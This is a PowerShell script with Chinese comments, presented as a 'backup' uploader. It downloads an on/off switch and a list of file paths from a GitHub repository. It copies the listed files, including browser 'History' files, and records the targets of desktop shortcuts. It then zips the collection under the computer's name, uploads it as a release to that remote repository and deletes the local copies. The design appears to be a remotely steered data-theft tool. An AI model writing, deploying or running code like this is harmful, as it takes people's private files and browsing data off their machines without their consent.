# console.ps1 - 多路径上传脚本（带开关）

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "ertgyhujkfghj/2"
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Write-Host "❌ GITHUB_TOKEN 未设置，退出。" ; exit 1
}

# 开关判断
$enabledUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/.github/upload-enabled.txt"
try {
    $switch = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing -ErrorAction Stop
    if ($switch.Trim().ToLower() -ne "on") {
        Write-Host "⏹️ 上传未启用，upload-enabled.txt = '$switch'"
        exit 0
    }
} catch {
    Write-Host "⚠️ 无法获取 upload-enabled.txt，默认跳过"
    exit 0
}

# 获取路径列表
$pathsUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/.github/upload-paths.txt"
try {
    $pathList = Invoke-RestMethod -Uri $pathsUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    Write-Host "❌ 获取路径列表失败" ; exit 1
}

# 临时目录
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$tag = "backup-$env:COMPUTERNAME-$timestamp"
$tempDir = "$env:TEMP\backup-$timestamp"
$zipPath = "$env:TEMP\$tag.zip"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 遍历路径上传
$index = 0
foreach ($path in $pathList) {
    $index++
    $subName = "item$index"
    $dest = Join-Path $tempDir $subName

    if (-not (Test-Path $path)) { continue }

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {}
}

# 快捷方式信息提取
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""

    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkFile = Join-Path $tempDir "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkFile -Encoding UTF8
} catch {}

# 打包
Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force -ErrorAction SilentlyContinue

# 上传到 GitHub Release
$release = @{
    tag_name   = $tag
    name       = "Backup - $tag"
    body       = "自动上传的备份文件包"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "PowerShellUploader"
    Accept        = "application/vnd.github.v3+json"
}

try {
    $resp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $release -ErrorAction Stop
    $uploadUrl = $resp.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellUploader"
    }
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
    Write-Host "✅ 上传完成：$tag.zip"
} catch {
    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
}

Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
